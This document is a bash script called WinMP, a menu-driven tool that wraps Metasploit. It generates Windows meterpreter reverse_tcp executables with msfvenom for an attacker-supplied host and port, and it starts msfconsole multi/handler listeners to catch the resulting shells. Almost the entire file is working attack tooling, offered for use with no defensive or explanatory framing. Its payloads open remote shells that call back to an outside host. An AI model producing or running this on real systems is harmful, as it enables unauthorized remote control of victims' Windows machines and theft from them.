#!/bin/bash
#title		:WinMP
#description	:A simple reverse_tcp generator meant for Windows. It uses the metasploit framework.
#author		:hasnieking
#usage		:bash winmp.sh
#notes		:You need the metasploit framework for this to work.


LGREEN='\033[1;32m'
GREEN='\033[0;32m'
NC='\033[0m'
LBLUE='\033[1;34m'
CYAN='\033[0;36m'
RED='\033[0;31m'
GEN='\033[1;4;32m'

echo ""
echo -e "${LGREEN}"
echo " WW   WW   WW  iIIIIIIi  NNnn      NN     mMMMMMMMMm   PPPPPPPp"
echo " WW   WW   WW     II     NN nn     NN    MM   MM   MM  PP      P"
echo " WW   WW   WW     II     NN  nn    NN    MM   MM   MM  PP      p" 
echo " WW   WW   WW     II     NN   nn   NN    MM   MM   MM  PPPPPPPP"
echo " WW   WW   WW     II     NN    nn  NN    MM   MM   MM  PP" 
echo " WW   WW   WW     II     NN     nn NN    MM   MM   MM  PP"
echo "  WwwwwwwwwW   iIIIIIIi  NN      nnNN    MM   MM   MM  PP"
echo -e "${GREEN}                                           -author: hasnieking"
echo -e "${LBLUE}"
echo "Select an option to begin:"
echo -e "${NC}"

PS3='Select:'
options=("Create 64-bit (x64)" "Create 32-bit (x86)" "Listen 64-Bit" "Listen 32-Bit" "Quit")
select opt in "${options[@]}"
do
	echo
	case $opt in
		"Create 64-bit (x64)")
			clear
			echo "You chose to create a 64-Bit payload"
			echo -e "${LBLUE}Enter Host IP:${NC}"
			read LHOST
			echo "Your Host IP is now $LHOST."
			echo -e "${LBLUE}Enter Port:${NC}"
			read LPORT
			echo "Your Port is now $LPORT"
			echo -e "${LBLUE}Enter Name:${NC}"
			read NAME
			mkdir /root/winmp/payloads
			clear
			echo -e "${GEN}GENERATING:${NC}"
			msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > /root/winmp/payloads/$NAME.exe
			echo -e "${CYAN}File is saved to /root/winmp/payloads${NC}"
			break
			;;
		"Create 32-bit (x86)")
			clear
			echo "You chose to create a 32-Bit Payload"
			echo -e "${LBLUE}Enter Host IP:${NC}"
			read LHOST
			echo "Your Host IP is now $LHOST."
			echo -e "${LBLUE}Enter Port:${NC}"
			read LPORT
			echo "Your Port is now $LPORT"
			echo -e "${LBLUE}Enter Name:${NC}"
			read NAME
			mkdir /root/winmp/payloads
			clear
			echo -e "${GEN}GENERATING:${NC}"
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > /root/winmp/payloads/$NAME.exe
			echo -e "${CYAN}File is saved to /root/winmp/payloads${NC}"
			break
			;;

		"Listen 64-Bit")
			mkdir /root/winmp/temp
			truncate -s 0 "/root/winmp/temp/Win64.tmp"
			clear
			echo use multi/handler >> "/root/winmp/temp/Win64.tmp"
			echo -e "${LBLUE}Enter Host IP:${NC}"
			read LHOST
			echo set LHOST $LHOST >> "/root/winmp/temp/Win64.tmp"
			echo "Your Host IP is now $LHOST."
			echo -e "${LBLUE}Enter Port:${NC}"
			read LPORT
			echo set LPORT $LPORT >> "/root/winmp/temp/Win64.tmp"
			echo "Your Port is now $LPORT"
			echo "set payload windows/x64/meterpreter/reverse_tcp" >> "/root/winmp/temp/Win64.tmp"
			echo exploit >> "/root/winmp/temp/Win64.tmp"
			xterm -fa monaco -fs 11 -bg black -e msfconsole -r "/root/winmp/temp/Win64.tmp"
			break
			;;

		"Listen 32-Bit")
mkdir /root/winmp/temp
			truncate -s 0 "/root/winmp/temp/Win32.tmp"
			clear
			echo use multi/handler >> "/root/winmp/temp/Win32.tmp"
			echo -e "${LBLUE}Enter Host IP:${NC}"
			read LHOST
			echo set LHOST $LHOST >> "/root/winmp/temp/Win32.tmp"
			echo "Your Host IP is now $LHOST."
			echo -e "${LBLUE}Enter Port:${NC}"
			read LPORT
			echo set LPORT $LPORT >> "/root/winmp/temp/Win32.tmp"
			echo "Your Port is now $LPORT"
			echo "set payload windows/meterpreter/reverse_tcp" >> "/root/winmp/temp/Win32.tmp"
			echo exploit >> "/root/winmp/temp/Win32.tmp"
			xterm -fa monaco -fs 11 -bg black -e msfconsole -r "/root/winmp/temp/Win32.tmp"
			
			break
			;;

		"Quit")
			break
			;;
		*)
			echo -e "${RED}Invalid Option${NC}"
			;;
	esac
done
